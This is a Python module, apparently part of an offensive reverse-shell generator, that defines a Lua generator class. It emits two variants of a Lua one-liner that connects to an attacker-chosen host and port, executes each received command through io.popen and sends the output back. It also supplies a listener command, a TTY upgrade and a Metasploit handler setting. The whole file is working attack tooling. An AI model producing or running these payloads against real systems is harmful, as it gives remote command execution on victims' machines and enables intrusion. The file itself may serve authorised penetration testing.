import random
from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler, LISTENER_FMT

_VARIANTS = ["socket_exec", "io_popen"]


class LuaGenerator(ShellGenerator):
    language = "lua"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)
        if variant == "socket_exec":
            cmd = self._socket_exec(opts, names)
        else:
            cmd = self._io_popen(opts, names)

        return ShellResult(
            command=cmd, variant=variant, language=self.language, arch=opts.arch,
            listener=LISTENER_FMT.format(lport=opts.lport),
            tty_upgrade=TTY_UPGRADE,
            msf_compat=msf_handler("payload/cmd/unix/reverse", opts.lhost, opts.lport),
        )

    def _socket_exec(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        return (
            f'lua -e "local s=require(\'socket\');"'
            f'"local t=assert(s.tcp());"'
            f'"t:connect(\'{opts.lhost}\',{opts.lport});"'
            f'"while true do local r,x=t:receive();'
            f"local f=io.popen(r,'r');local b=f:read('*a');"
            f't:send(b);end;"'
        )

    def _io_popen(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        return (
            f'lua5.1 -e \'local s=require("socket");'
            f'local t=assert(s.tcp());'
            f't:connect("{opts.lhost}",{opts.lport});'
            f'while true do '
            f'local r=t:receive();'
            f'if r then '
            f'local h=io.popen(r);'
            f'local res=h:read("*a");'
            f'h:close();'
            f't:send(res) '
            f'end end\''
        )
